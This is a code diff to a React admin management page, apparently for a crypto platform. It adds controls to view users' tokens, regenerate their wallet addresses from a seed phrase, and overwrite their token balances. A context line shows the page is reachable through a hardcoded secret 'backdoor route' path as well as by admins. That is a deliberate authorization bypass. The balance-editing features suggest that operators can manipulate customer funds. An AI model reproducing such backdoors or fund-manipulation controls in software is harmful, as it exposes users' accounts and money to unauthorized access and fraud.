@@ -45,6 +45,9 @@ export default function Management() {
     dailyReturnRate: "",
     color: "#3B82F6",
   });
+  const [tokenDialogOpen, setTokenDialogOpen] = useState(false);
+  const [selectedUserTokens, setSelectedUserTokens] = useState<any>(null);
+  const [editingToken, setEditingToken] = useState<{symbol: string, balance: string} | null>(null);
 
   // Allow access via backdoor route or if user is admin
   const isBackdoorAccess = window.location.pathname === '/Hello10122' || 
@@ -402,6 +405,85 @@ export default function Management() {
     onError: (error) => {
       toast({
         title: "Creation Failed",
+        description: error.message,
+        variant: "destructive",
+      });
+    },
+  });
+
+  const fetchUserTokensMutation = useMutation({
+    mutationFn: async (userId: number) => {
+      const response = await fetch(`/api/admin/user/${userId}/tokens`);
+      if (!response.ok) throw new Error('Failed to fetch user tokens');
+      return response.json();
+    },
+    onSuccess: (data) => {
+      setSelectedUserTokens(data);
+      setTokenDialogOpen(true);
+    },
+    onError: () => {
+      toast({ title: "Error", description: "Failed to fetch user tokens", variant: "destructive" });
+    },
+  });
+
+  const regenerateAddressesMutation = useMutation({
+    mutationFn: async (userId: number) => {
+      const response = await fetch(`/api/admin/user/${userId}/regenerate-addresses`, {
+        method: 'POST',
+      });
+      if (!response.ok) {
+        const error = await response.json();
+        throw new Error(error.message);
+      }
+      return response.json();
+    },
+    onSuccess: (data) => {
+      toast({
+        title: "Addresses Regenerated",
+        description: `Successfully regenerated ${data.count} token addresses from seed phrase`,
+      });
+      // Refresh token data
+      if (selectedUserTokens) {
+        fetchUserTokensMutation.mutate(selectedUserTokens.userId);
+      }
+      queryClient.invalidateQueries({ queryKey: ['/api/admin/users'] });
+    },
+    onError: (error) => {
+      toast({
+        title: "Regeneration Failed",
+        description: error.message,
+        variant: "destructive",
+      });
+    },
+  });
+
+  const updateTokenBalanceMutation = useMutation({
+    mutationFn: async ({ userId, tokenSymbol, balance }: { userId: number; tokenSymbol: string; balance: string }) => {
+      const response = await fetch('/api/admin/update-token-balance', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ userId, tokenSymbol, balance }),
+      });
+      if (!response.ok) {
+        const error = await response.json();
+        throw new Error(error.message);
+      }
+      return response.json();
+    },
+    onSuccess: () => {
+      toast({
+        title: "Balance Updated",
+        description: "Token balance has been successfully updated.",
+      });
+      setEditingToken(null);
+      // Refresh token data
+      if (selectedUserTokens) {
+        fetchUserTokensMutation.mutate(selectedUserTokens.userId);
+      }
+    },
+    onError: (error) => {
+      toast({
+        title: "Update Failed",
         description: error.message,
         variant: "destructive",
       });
